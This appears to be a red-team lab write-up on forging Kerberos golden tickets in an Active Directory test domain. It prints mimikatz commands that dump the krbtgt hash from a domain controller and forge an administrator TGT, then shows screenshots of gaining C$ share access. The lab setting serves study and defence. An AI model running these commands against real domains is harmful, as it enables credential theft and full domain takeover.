---
description: Persistence and Privilege Escalation with Golden Kerberots tickets
---

# Kerberos: Golden Tickets

This lab explores an attack on Active Directory Kerberos Authentication. To be more precise - an attack that forges Kerberos Ticket Granting Tickets \(TGT\) that are used to authenticate users with Kerberos. TGTs are used when requesting Ticket Granting Service \(TGS\) tickets, which means a forged TGT can get us any TGS ticket - hence it's golden.

This attack assumes a Domain Controller compromise where `KRBTGT` account hash will be extracted.

## Execution

Extracting the krbtgt account's password `NTLM` hash:

{% code-tabs %}
{% code-tabs-item title="attacker@victim-dc" %}
```csharp
mimikatz # lsadump::lsa /inject /name:krbtgt
```
{% endcode-tabs-item %}
{% endcode-tabs %}

![](../../.gitbook/assets/kerberos-golden-krbtgt-hash.png)

Creating a forget golden ticket that automatically gets injected in current logon session's memory:

{% code-tabs %}
{% code-tabs-item title="attacker@victim-workstation" %}
```text
mimikatz # kerberos::golden /domain:offense.local /sid:S-1-5-21-4172452648-1021989953-2368502130 /rc4:8584cfccd24f6a7f49ee56355d41bd30 /user:newAdmin /id:500 /ptt
```
{% endcode-tabs-item %}
{% endcode-tabs %}

![](../../.gitbook/assets/kerberos-golden-create.png)

Checking the ticket got created:

![](../../.gitbook/assets/kerberos-golden-klist.png)

Opening another powershell console with non-elevated privileges/non-admin account and trying to mount a `c$` share of `pc-mantvydas` and `dc-mantvydas` - not surprisingly, returns access denied:

![](../../.gitbook/assets/kerberos-golden-denied.png)

Now switching back to the console the attacker used to create a golden ticket \(local admin\) and again attempting to access `c$` share - this time a success:

![](../../.gitbook/assets/kerberos-golden-granted.png)

## Observations

![](../../.gitbook/assets/kerberos-golden-logon.png)

![](../../.gitbook/assets/kerberos-golden-share.png)

{% embed url="https://blog.stealthbits.com/complete-domain-compromise-with-golden-tickets/" %}

{% embed url="https://adsecurity.org/?p=1515" %}

